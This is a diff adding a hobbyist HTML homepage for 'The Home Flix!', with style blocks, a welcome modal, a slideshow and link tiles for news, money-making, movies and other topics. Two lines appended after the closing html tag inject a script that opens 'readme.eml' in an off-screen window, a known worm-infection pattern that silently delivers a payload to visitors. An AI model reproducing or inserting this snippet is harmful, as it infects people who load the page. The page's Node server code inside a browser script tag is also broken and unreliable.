@@ -1,0 +1,1131 @@
+<!DOCTYPE html>
+<html>
+
+<title>The Home Flix!</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="shortcut icon" href="stay4.gif" />
+<link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+<link rel="stylesheet" href="style.css">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto">
+<style>
+* {
+  box-sizing: border-box;
+}
+.menu {
+  float: left;
+  width: 20%;
+}
+.menuitem {
+  padding: 8px;
+  margin-top: 7px;
+  border-bottom: 1px solid #f1f1f1;
+}
+.main {
+  float: left;
+  width: 60%;
+  padding: 0 20px;
+  overflow: hidden;
+}
+.right {
+  background-color: lightblue;
+  float: left;
+  width: 20%;
+  padding: 10px 15px;
+  margin-top: 7px;
+}
+
+@media only screen and (max-width:800px) {
+  /* For tablets: */
+  .main {
+    width: 80%;
+    padding: 0;
+  }
+  .right {
+    width: 100%;
+  }
+}
+@media only screen and (max-width:500px) {
+  /* For mobile phones: */
+  .menu, .main, .right {
+    width: 100%;
+  }
+}
+</style>
+
+
+<style>
+body,h1,h2,h3,h4,h5 {font-family: "Poppins", sans-serif}
+body {font-size: 16px;}
+img {margin-bottom: -8px;}
+.mySlides {display: none;}
+</style>
+
+<style>
+html,body,h1,h2,h3,h4,h5,h6 {font-family: "Roboto", sans-serif;}
+.w3-sidebar {
+  z-index: 3;
+  width: 250px;
+  top: 43px;
+  bottom: 0;
+  height: inherit;
+}
+
+</style>
+<style>
+body,h1,h2,h3,h4,h5 {font-family: "Poppins", sans-serif}
+body {font-size: 16px;}
+img {margin-bottom: -8px;}
+.mySlides {display: none;}
+</style>
+
+<style>
+#myProgress {
+  width: 100%;
+  background-color: #blue;
+}
+
+#myBar {
+  width: 10%;
+  height: 30px;
+  background-color: orange;
+  text-align: center;
+  line-height: 30px;
+  color: white;
+}
+</style>
+<style>
+body {
+  background-color: black;
+  font-family: cursive;
+}
+
+.glow {
+
+  color: #fff;
+  text-align: center;
+  -webkit-animation: glow 1s ease-in-out infinite alternate;
+  -moz-animation: glow 1s ease-in-out infinite alternate;
+  animation: glow 1s ease-in-out infinite alternate;
+}
+
+@-webkit-keyframes glow {
+  from {
+    text-shadow: 0 0 10px #fff, 0 0 20px #fff, 0 0 30px #e60073, 0 0 40px #e60073, 0 0 50px #e60073, 0 0 60px #e60073, 0 0 70px #e60073;
+  }
+
+  to {
+    text-shadow: 0 0 20px #fff, 0 0 30px #ff4da6, 0 0 40px #ff4da6, 0 0 50px #ff4da6, 0 0 60px #ff4da6, 0 0 70px #ff4da6, 0 0 80px #ff4da6;
+  }
+}
+
+.container {
+  position: relative;
+  width: 50%;
+}
+
+.image {
+  opacity: 1;
+  display: block;
+  width: 100%;
+  height: auto;
+  transition: .5s ease;
+  backface-visibility: hidden;
+}
+
+.middle {
+  transition: .5s ease;
+  opacity: 0;
+  position: relative;
+  top: 50%;
+  left: 50%;
+  transform: translate(-50%, -50%);
+  -ms-transform: translate(-50%, -50%)
+}
+
+.container:hover .image {
+  opacity: 0.95;
+}
+
+.container:hover .middle {
+  opacity: 0.9;
+}
+
+
+.text {
+border-radius: 20px;
+  background-color: #ffa500;
+  color: white;
+  font-size: 20px;
+  padding: 16px 32px;
+}
+img {
+  border: 1px solid #ddd;
+  border-radius: 4px;
+  padding: 5px;
+  width: 150px;
+}
+
+img:hover {
+  box-shadow: 0 0 2px 1px rgba(0, 140, 186, 0.5);
+}
+
+</style>
+
+<style>
+.button {
+  display: inline-block;
+  padding: 15px 25px;
+  font-size: 24px;
+  cursor: pointer;
+  text-align: center;
+  text-decoration: none;
+  outline: none;
+  color: #fff;
+  background-color: #FFA500;
+  border: none;
+  border-radius: 15px;
+  box-shadow: 0 -3px #ADFF2F;
+}
+
+.button:hover {background-color: #FF0000}
+
+.button:active {
+  background-color: #ADFF2F;
+  box-shadow: 0 5px #666;
+  transform: translateY(4px);
+}
+.button span {
+  cursor: pointer;
+  display: inline-block;
+  position: relative;
+  transition: 0.5s;
+}
+
+.button span:after {
+  content: '\00bb';
+  position: absolute;
+  opacity: 0;
+  top: 0;
+  right: -20px;
+  transition: 0.5s;
+}
+
+.button:hover span {
+  padding-right: 25px;
+}
+
+.button:hover span:after {
+  opacity: 1;
+  right: 0;
+}
+</style>
+
+
+
+
+
+<style>
+body {
+  font-family: Verdana, sans-serif;
+  margin: 0;
+}
+
+* {
+  box-sizing: border-box;
+}
+
+.row > .column {
+  padding: 0 8px;
+}
+
+.row:after {
+  content: "";
+  display: table;
+  clear: both;
+}
+
+.column {
+  float: left;
+  width: 25%;
+}
+
+/* The Modal (background) */
+.modal {
+  display: none;
+  position: fixed;
+  z-index: 1;
+  padding-top: 100px;
+  left: 0;
+  top: 0;
+  width: 100%;
+  height: 100%;
+  overflow: auto;
+  opacity: 0.9;
+  background-color: black;
+   border-radius:10px;
+}
+
+/* Modal Content */
+.modal-content {
+  position: relative;
+  background-color: #fefefe;
+  margin: auto;
+  padding: 0;
+  width: 80%;
+  max-width: 1200px;
+  opacity:0.95;
+}
+
+/* The Close Button */
+.close {
+  color: white;
+  position: absolute;
+  top: 10px;
+  right: 25px;
+  font-size: 70px;
+  font-weight: bold;
+}
+
+.close:hover,
+.close:focus {
+  color: #999;
+  text-decoration: none;
+  cursor: pointer;
+}
+
+.mySlides {
+  display: none;
+}
+
+.cursor {
+  cursor: pointer;
+}
+
+/* Next & previous buttons */
+
+.next {
+  cursor: pointer;
+  position: absolute;
+  top: 50%;
+  width: auto;
+  padding: 20px;
+  margin-top: -50px;
+  color: grey;
+  font-weight: bold;
+  font-size: 50px;
+  transition: 0.6s ease;
+  border-radius: 0 3px 3px 0;
+  user-select: none;
+  -webkit-user-select: none;
+}
+
+/* Position the "next button" to the right */
+.next {
+  right: 0;
+  border-radius: 3px 0 0 3px;
+}
+
+/* On hover, add a black background color with a little bit see-through */
+.prev:hover,
+.next:hover {
+  background-color: rgba(0, 0, 0, 0.8);
+}
+
+/* Number text (1/3 etc) */
+.numbertext {
+  color: #C0C0C0;
+  font-size: 20px;
+  padding: 8px 12px;
+  position: absolute;
+  top: 0;
+}
+
+img {
+  margin-bottom: -4px;
+}
+
+.caption-container {
+  text-align: center;
+  background-color: black;
+  padding: 2px 16px;
+  color: white;
+}
+
+.demo {
+  opacity: 0.6;
+}
+
+.active,
+.demo:hover {
+  opacity: 0.5;
+}
+
+img.hover-shadow {
+  transition: 0.3s;
+}
+
+.hover-shadow:hover {
+  box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19);
+}
+</style>
+
+<!cindy contained>
+<style>
+.contained {
+  position: relative;
+  top: calc(50% - 150px);
+  left: calc(50% - 150px);
+  width: 500px;
+  height: 200px;
+margin-top: -100px; /* Negative half of height. */
+margin-left: -250px; /* Negative half of width. */
+  max-width: 400px;
+  margin: 4em auto;
+  background: #f36f21;
+  border-radius: 20px;
+  text-align: center;
+  opacity:1;
+  }
+
+
+.hoveri {
+	background-color: #FFF;
+}
+  </style>
+
+
+<!lets go button>
+  <style>
+.button {
+  display: inline-block;
+  border-radius: 15px;
+  background-color: #f4511e;
+  border: none;
+  color: #FFFFFF;
+  text-align:center;
+  font-size: 28px;
+  padding: 10px;
+  width: 200px;
+  height: 50px;
+  transition: all 0.5s;
+  cursor: pointer;
+  margin: 3px;
+
+}
+
+.button span {
+  cursor: pointer;
+  display: inline-block;
+  position: relative;
+  transition: 0.5s;
+}
+
+.button span:after {
+  content: '\00bb';
+  position: absolute;
+  opacity: 0;
+  top: 0;
+  right: -20px;
+  transition: 0.5s;
+}
+
+.button:hover span {
+  padding-right: 24px;
+}
+
+.button:hover span:after {
+  opacity: 1;
+  right: 0;
+}
+</style>
+<style>
+.glowy {
+  position: relative;
+
+
+  border-radius: 50%;
+  box-shadow:
+    inset 0 0 50px #fff,
+    inset 20px 0 80px #f0f,
+    inset -20px 0 80px #0ff,
+    inset 20px 0 300px #f0f,
+    inset -20px 0 300px #0ff,
+    0 0 50px #fff,
+    -10px 0 80px #f0f,
+    10px 0 80px #0ff;
+}
+</style>
+
+
+
+
+<!search buttom>
+<style>
+
+@import url(https://fonts.googleapis.com/css?family=Open+Sans);
+
+.search {
+  width: 100%;
+  position: relative;
+  display: flex;
+}
+
+.searchTerm {
+  width: 100%;
+  border: 5px solid #00B4CC;
+  border-right: none;
+  padding: 5px;
+  height: 40px;
+  border-radius: 5px 0 0 25px;
+  outline: none;
+  color: #9DBFAF;
+}
+
+.searchTerm:focus{
+  color: #00B4CC;
+}
+
+.searchButton {
+  width: 55px;
+  height: 39px;
+  border: 10px solid #00B4CC;
+  background: #00B4CC;
+  text-align: center;
+  color: #fff;
+  border-radius: 0 5px 5px 0;
+  cursor: pointer;
+  font-size: 20px;
+}
+
+/*Resize the wrap to see the search bar change!*/
+.wrap{
+  width: 30%;
+  position: relative;
+  top: 50%;
+  left: 80%;
+  transform: translate(-50%, -50%);
+}
+
+</style>
+
+<!the modal>
+<style>
+body {font-family: Arial, Helvetica, sans-serif;}
+
+/* The Modal (background) */
+.modal {
+  display: none; /* Hidden by default */
+  position: fixed; /* Stay in place */
+  z-index: 1; /* Sit on top */
+  padding-top: 100px; /* Location of the box */
+  left: 0;
+  top: 0;
+  width: 100%; /* Full width */
+  height: 100%; /* Full height */
+
+  overflow: auto; /* Enable scroll if needed */
+  background-color: rgb(0,0,0); /* Fallback color */
+  background-color: rgba(0,0,0,0.4); /* Black w/ opacity */
+}
+
+/* Modal Content a.k.a in the box*/
+.modal-content {
+  background-color: #fefefe;
+  margin: auto;
+  padding: 20px;
+  border: 7px solid #d3d3d3;
+  width: 70%;
+  height: 70%;
+  border-radius: 20px;
+}
+
+/* The Close Button */
+.close {
+  color: #aaaaaa;
+  float: right;
+  font-size: 43px;
+  font-weight: bold;
+}
+
+.close:hover,
+.close:focus {
+  color: #000;
+  text-decoration: none;
+  cursor: pointer;
+}
+</style>
+<!transition>
+<style>
+.trant {
+  width: 200px;
+  height: 50px;
+
+  transition: width 2s, height 4s;
+}
+
+.trant:hover {
+  width: 210px;
+  height: 60px;
+}
+</style>
+<!style slide>
+
+
+<style>
+.mySlides {display:none;height:340px;width:400px;}
+.w3-left,
+.w3-right,
+.w3-badge {
+  cursor:pointer;
+  font-size: 50px;
+  font-weight: bold;
+  border-radius: 20px;
+  background:black;}
+.w3-badge {height:40px;width:40px;padding:20px;background:black;}
+</style>
+<style>
+#test {
+    margin-top: 25px;
+    font-size: 21px;
+    text-align: center;
+
+    -webkit-animation: fadein 2s; /* Safari, Chrome and Opera > 12.1 */
+       -moz-animation: fadein 2s; /* Firefox < 16 */
+        -ms-animation: fadein 2s; /* Internet Explorer */
+         -o-animation: fadein 2s; /* Opera < 12.1 */
+            animation: fadein 2s;
+}
+
+@keyframes fadein {
+    from { opacity: 0; }
+    to   { opacity: 1; }
+}
+
+/* Firefox < 16 */
+@-moz-keyframes fadein {
+    from { opacity: 0; }
+    to   { opacity: 1; }
+}
+
+/* Safari, Chrome and Opera > 12.1 */
+@-webkit-keyframes fadein {
+    from { opacity: 0; }
+    to   { opacity: 1; }
+}
+
+/* Internet Explorer */
+@-ms-keyframes fadein {
+    from { opacity: 0; }
+    to   { opacity: 1; }
+}
+
+/* Opera < 12.1 */
+@-o-keyframes fadein {
+    from { opacity: 0; }
+    to   { opacity: 1; }
+}
+</style>
+
+<!style+test over>
+
+<!the modal over>
+</head>
+<body background="blur2.jpg">
+
+  <!Navbar >
+  <div class="w3-top w3-bar  w3-black"  >
+    <div class="w3-bar w3-theme w3-top w3-left-align w3-large w3-black">
+      <a class="w3-bar-item w3-button w3-right w3-hide-large w3-black w3-hover-white w3-large w3-theme-l1" href="javascript:void(0)" onclick="w3_open()"><i class="fa fa-bars"></i></a>
+
+      <a href="iindex.html" class="w3-bar-item w3-black w3-button w3-padding-20 " >Home</a>
+      <a href="whatsapp://send?text=https://homeflix9.com/!" data-action="share/whatsapp/share" class="w3-bar-item w3-green w3-button w3-padding-20 " >Share via Whatsapp</a>
+      <a href="http://raboninco.com/F77d" class="w3-bar-item w3-black w3-button w3-padding-20 "  target="_blank">Comming-Soon!</a>
+      <a href="http://raboninco.com/IeeR"class="w3-bar-item w3-red w3-button w3-padding-20 "  target="_blank">Socialize</a>
+
+<!div align="right" class="w3-bar-item w3-black w3-button w3-padding-20">
+   <!div class="search">
+      <!input type="text" class="searchTerm" placeholder="Ask Cindy Anything😌">
+      <!button type="submit" class="searchButton">
+        <!i class="fa fa-search"><!/i>
+     <!/button>
+   <!/div>
+<!/div>
+
+    </div>
+  </div>
+  </div>
+
+<div class="w3-bar w3-coral w3-border w3-hover-light-pink">
+  <a href="index.html" class="w3-bar-item w3-button w3-blue"><i class="fa fa-home"></i></a>
+  <a href="https://accounts.google.com/ServiceLogin/identifier?hl=en&passive=true&continue=https%3A%2F%2Fwww.google.com%2F&flowName=GlifWebSignIn&flowEntry=AddSession" class="w3-bar-item w3-button" target="_blank"><i class="fa fa-envelope"></i></a>
+  <a href="https://www.google.com/" class="w3-bar-item w3-button" target="_blank"><i class="fa fa-globe"></i></a>
+</div>
+
+</div>
+<!MODAL BODY INTRO>
+<!-- Trigger/Open The Modal -->
+<!-- ----------<button id="myBtn">Cindy's Tour</button> -->
+<!-- The Modal -->
+<div id="myModal" class="modal">
+
+  <!-- Modal content -->
+  <div id="test" class="modal-content">
+    <span class="close">&times;</span>
+    <p>
+<!slides+content>
+<div id="test"class="w3-content w3-display-container" style="max-width:800px">
+  <img class="mySlides glowy" src="cindy.png" style="width:100%">
+  <img class="mySlides" src="home.jpg" style="width:100%">
+  <img class="mySlides" src="skipadd.jpg" style="width:100%">
+  <div class="w3-center w3-container w3-section w3-large w3-text-white w3-display-bottommiddle" style="width:100%">
+    <div class="w3-left w3-hover-text-khaki" onclick="plusDivs(-1)">&#10094;</div>
+    <div class="w3-right w3-hover-text-khaki" onclick="plusDivs(1)">&#10095;</div>
+    <span class="w3-badge demo w3-border w3-transparent w3-hover-white" onclick="currentDiv(1)"></span>
+    <span class="w3-badge demo w3-border w3-transparent w3-hover-white" onclick="currentDiv(2)"></span>
+    <span class="w3-badge demo w3-border w3-transparent w3-hover-white" onclick="currentDiv(3)"></span>
+  </div>
+</div>
+
+<script>
+var slideIndex = 1;
+showDivs(slideIndex);
+
+function plusDivs(n) {
+  showDivs(slideIndex += n);
+}
+
+function currentDiv(n) {
+  showDivs(slideIndex = n);
+}
+
+function showDivs(n) {
+  var i;
+  var x = document.getElementsByClassName("mySlides");
+  var dots = document.getElementsByClassName("demo");
+  if (n > x.length) {slideIndex = 1}
+  if (n < 1) {slideIndex = x.length}
+  for (i = 0; i < x.length; i++) {
+    x[i].style.display = "none";
+  }
+  for (i = 0; i < dots.length; i++) {
+    dots[i].className = dots[i].className.replace(" w3-white", "");
+  }
+  x[slideIndex-1].style.display = "block";
+  dots[slideIndex-1].className += " w3-white";
+}
+</script>
+<!slides over>
+
+<!-->
+      <div class="glowy "align="center">
+      <div class="contained row column hover-shadow cursor" align="center">
+         <p><font color="white">Hello!,Im Cindy🥰your Homeflix assistant!<br> New here?🤔,L.O.L,Welcome At Our Homeflix9 Platform!, cutting the story short, let's take a quick tour of introduction</font></p>
+      <button class="button trant hover-shadow cursor" style="vertical-align:middle"onclick="openModal();currentSlide(1)" ><span>LETS GO🏃‍♀️ </span></button>
+      </div>
+-->
+
+
+
+
+
+    </p>
+  </div>
+
+</div>
+
+<script>
+// Get the modal
+var modal = document.getElementById("myModal");
+
+// Get the button that opens the modal
+var btn = document.getElementById("myBtn");
+
+// Get the <span> element that closes the modal
+var span = document.getElementsByClassName("close")[0];
+
+// When the user clicks the button, open the modal
+window.onload = function() {
+  modal.style.display = "block";
+}
+
+// When the user clicks on <span> (x), close the modal
+span.onclick = function() {
+  modal.style.display = "none";
+}
+
+// When the user clicks anywhere outside of the modal, close it
+window.onclick = function(event) {
+  if (event.target == modal) {
+    modal.style.display = "none";
+  }
+}
+</script>
+
+
+<!MODAL BODY OUTRO>
+
+<!INTRODUCTION>
+<!-- CINDYS CONTENT
+<div class="glowy "align="center">
+<div class="contained row column hover-shadow cursor" align="center">
+   <p><font color="white">Hello!,Im Cindy🥰your Homeflix assistant!<br> New here?🤔,L.O.L,Welcome At Our Homeflix9 Platform!, cutting the story short, let's take a quick tour of introduction</font></p>
+<button class="button hover-shadow cursor" style="vertical-align:middle"onclick="openModal();currentSlide(1)" ><span>LETS GO🏃‍♀️ </span></button>
+</div>
+-->
+
+<div id="myModal" class="modal">
+  <span class="close cursor" onclick="closeModal()">&times;</span>
+  <div class="modal-content">
+
+
+    <div class="mySlides">
+      <div class="numbertext">1 / 2</div>
+      <img src="home.jpg" style="width:100%">
+    </div>
+
+    <div class="mySlides">
+      <div class="numbertext">2 / 2</div>
+      <img src="skipadd.jpg" style="width:100%">
+    </div>
+
+    <a class="prev" onclick="plusSlides(-1)"alt="Nature and sunrise">&#10094;</a>
+    <a class="next" onclick="plusSlides(1)">&#10095;</a>
+
+    <div class="caption-container">
+      <p id="caption"></p>
+    </div>
+</div>
+
+  </div>
+</div>
+
+<script>
+openOnLoad: true
+function openModal() {
+  document.getElementById("myModal").style.display = "block";
+}
+
+function closeModal() {
+  document.getElementById("myModal").style.display = "none";
+}
+
+var slideIndex = 1;
+showSlides(slideIndex);
+
+function plusSlides(n) {
+  showSlides(slideIndex += n);
+}
+
+function currentSlide(n) {
+  showSlides(slideIndex = n);
+}
+
+function showSlides(n) {
+  var i;
+  var slides = document.getElementsByClassName("mySlides");
+  var dots = document.getElementsByClassName("demo");
+  var captionText = document.getElementById("caption");
+  if (n > slides.length) {slideIndex = 1}
+  if (n < 1) {slideIndex = slides.length}
+  for (i = 0; i < slides.length; i++) {
+      slides[i].style.display = "none";
+  }
+  for (i = 0; i < dots.length; i++) {
+      dots[i].className = dots[i].className.replace(" active", "");
+  }
+  slides[slideIndex-1].style.display = "block";
+  dots[slideIndex-1].className += " active";
+  captionText.innerHTML = dots[slideIndex-1].alt;
+}
+
+</script>
+    <!OUTRODUCTION>
+<br>
+<! container 5>
+<div class="w3-row-padding">
+ <div class="w3-col l3 m6 w3-hover-yellow w3-margin-bottom">
+<a href="news.html">
+<div align="center" class="w3-container w3-yellow">
+   <div class="flip-card">
+     <div class="w3-topbar w3-border-amber"></div>
+     <div class="flip-card-inner">
+       <div class="flip-card-front">
+
+         <img src="newz.gif" alt="Avatar" style="width:300px;height:300px;">
+       </div>
+       <div class="flip-card-back">
+         <h1>Stay Home</h1>
+         <p>Stay Safe</p>
+         <p>Stay Updated</p>
+       </div>
+     </div>
+   </div>
+</a>
+
+   <h2>WORLD NEWS</h2>
+   <p>Watch News & Global Updates!!</p>
+ </div>
+   </div>
+   </div>
+</div>
+
+<! container 7>
+ <div class="w3-col l3 m6 w3-hover-green w3-margin-bottom">
+<a href="cashtemple.html">
+<div align="center" class="w3-container w3-green">
+   <div class="flip-card">
+     <div class="w3-topbar w3-border-amber"></div>
+     <div class="flip-card-inner">
+       <div class="flip-card-front">
+
+         <img src="money1.gif" alt="Avatar" style="width:300px;height:300px;">
+       </div>
+       <div class="flip-card-back">
+         <h1>Stay Home</h1>
+         <p>Stay Safe</p>
+         <p>Stay Rich</p>
+       </div>
+     </div>
+   </div>
+
+</a>
+   <h2>EARN MONEY</h2>
+   <p>Learn & Make Money Online!!!</p>
+
+ </div>
+   </div>
+   </div>
+</div>
+
+
+<! container 2>
+ <div class="w3-col l3 m6 w3-hover-blue w3-margin-bottom">
+<a href="school.html">
+<div align="center" class="w3-container w3-blue">
+   <div class="flip-card">
+     <div class="w3-topbar w3-border-amber"></div>
+     <div class="flip-card-inner">
+       <div class="flip-card-front">
+
+         <img src="school3.gif" alt="Avatar" style="width:300px;height:300px;">
+       </div>
+       <div class="flip-card-back">
+         <h1>Stay Home</h1>
+         <p>Stay Safe</p>
+         <p>Stay Literate</p>
+       </div>
+     </div>
+   </div>
+</a>
+
+   <h2>SCHOLARSHIPS!</h2>
+   <p>Also Get&Study All Notes Online+Library</p>
+ </div>
+   </div>
+   </div>
+</div>
+
+<! container 5>
+ <div class="w3-col l3 m6 w3-hover-yellow w3-margin-bottom">
+<a href="cooking.html">
+<div align="center" class="w3-container w3-yellow">
+   <div class="flip-card">
+     <div class="w3-topbar w3-border-amber"></div>
+     <div class="flip-card-inner">
+       <div class="flip-card-front">
+
+         <img src="cooking1.gif" alt="Avatar" style="width:300px;height:300px;">
+       </div>
+       <div class="flip-card-back">
+         <h1>Stay Home</h1>
+         <p>Stay Safe</p>
+         <p>Stay Cookie</p>
+       </div>
+     </div>
+   </div>
+</a>
+
+   <h2>COOKING CLASSES</h2>
+   <p>Learn cooking Lets Some mess in the Kitchen!</p>
+ </div>
+   </div>
+   </div>
+</div>
+
+<! container 4>
+ <div class="w3-col l3 m6 w3-hover-purple w3-margin-bottom">
+ <a href="movies.html">
+<div align="center" class="w3-container w3-purple">
+   <div class="flip-card">
+     <div class="w3-topbar w3-border-amber"></div>
+     <div class="flip-card-inner">
+       <div class="flip-card-front">
+
+         <img src="movies.gif" alt="Avatar" style="width:300px;height:300px;">
+       </div>
+       <div class="flip-card-back">
+         <h1>Stay Home</h1>
+         <p>Stay Safe</p>
+         <p>Stay Active</p>
+       </div>
+     </div>
+   </div>
+</a>
+
+   <h2>MOVIES TIME!!!</h2>
+   <p>Watch & Download Movies Allover The World!!!</p>
+ </div>
+   </div>
+   </div>
+</div>
+
+<! container 3>
+ <div class="w3-col l3 m6 w3-hover-brown w3-margin-bottom">
+<a href="bored.html">
+<div align="center" class="w3-container w3-brown">
+   <div class="flip-card">
+     <div class="w3-topbar w3-border-amber"></div>
+     <div class="flip-card-inner">
+       <div class="flip-card-front">
+
+         <img src="bored2.gif" alt="Avatar" style="width:300px;height:300px;">
+       </div>
+       <div class="flip-card-back">
+         <h1>Stay Home</h1>
+         <p>Stay Safe</p>
+         <p>Stay Healthy</p>
+       </div>
+     </div>
+   </div>
+</a>
+
+   <h2>I'M BORED!!!</h2>
+   <p>Feel bored? Let me show you something...leggo!!!</p>
+ </div>
+   </div>
+   </div>
+</div>
+
+<! container 6>
+ <div class="w3-col l3 m6 w3-hover-pink w3-margin-bottom">
+<a href="hacker.html">
+<div align="center" class="w3-container w3-pink">
+   <div class="flip-card">
+     <div class="w3-topbar w3-border-amber"></div>
+     <div class="flip-card-inner">
+       <div class="flip-card-front">
+
+         <img src="hack1.gif" alt="Avatar" style="width:300px;height:300px;">
+       </div>
+       <div class="flip-card-back">
+         <h1>Stay Home</h1>
+         <p>Stay Safe</p>
+         <p>Stay Cody</p>
+       </div>
+     </div>
+   </div>
+</a>
+
+   <h2>HACKING BASEMENT!</h2>
+   <p>Discover Deep Secrets Behind Computers...!</p>
+ </div>
+   </div>
+   </div>
+</div>
+
+
+
+<! container 1>
+ <div class="w3-col l3 m6 w3-hover-red w3-margin-bottom">
+<a href="corona.html">
+<div align="center" class="w3-container w3-red">
+   <div class="flip-card">
+     <div class="w3-topbar w3-border-amber"></div>
+     <div class="flip-card-inner">
+       <div class="flip-card-front">
+
+         <img src="corona2.gif" alt="Avatar" style="width:300px;height:300px;">
+       </div>
+       <div class="flip-card-back">
+         <h1>Stay Home</h1>
+         <p>Stay Safe</p>
+         <p>Stay Sanitized</p>
+       </div>
+     </div>
+   </div>
+</a>
+
+   <h2>CORONA TRENDS!!!</h2>
+   <p>Learn About Corona Virus,View Status,Take Action & Stay Safe!!!.</p>
+ </div>
+   </div>
+   </div>
+</div>
+
+
+<! container 8>
+ <div class="w3-col l3 m6 w3-hover-orange w3-margin-bottom">
+<a href="redemption.html">
+<div align="center" class="w3-container w3-orange">
+   <div class="flip-card">
+     <div class="w3-topbar w3-border-amber"></div>
+     <div class="flip-card-inner">
+       <div class="flip-card-front">
+
+         <img src="redemption2.gif" alt="Avatar" style="width:300px;height:300px;">
+       </div>
+       <div class="flip-card-back">
+         <h1>Stay Home</h1>
+         <p>Stay Safe</p>
+         <p>Stay Holy</p>
+       </div>
+     </div>
+   </div>
+</a>
+
+   <h2>REDEMPTION</h2>
+   <p>Guys,I Guess It's Time We Go Back To God!</p>
+ </div>
+   </div>
+   </div>
+</div>
+
+
+<div align="left">
+
+<script>
+var counter = 0;
+var app = require("express");
+app.get("/",function(req,res){
+ counter++;
+ res.render("main.ejs",{counter});
+});
+
+app.listen(80);
+</script>
+</div>
+
+
+<div class="w3-bar w3-tiny w3-black">
+
+    <div class="w3-bar-item">
+        </div><div align="center">
+        <p id="demo"></p>
+
+<script>
+var d = new Date();
+document.getElementById("demo").innerHTML = d;
+</script>
+</div>
+    </div>
+</div>
+
+
+
+</body>
+</html>
+
+<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
+<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
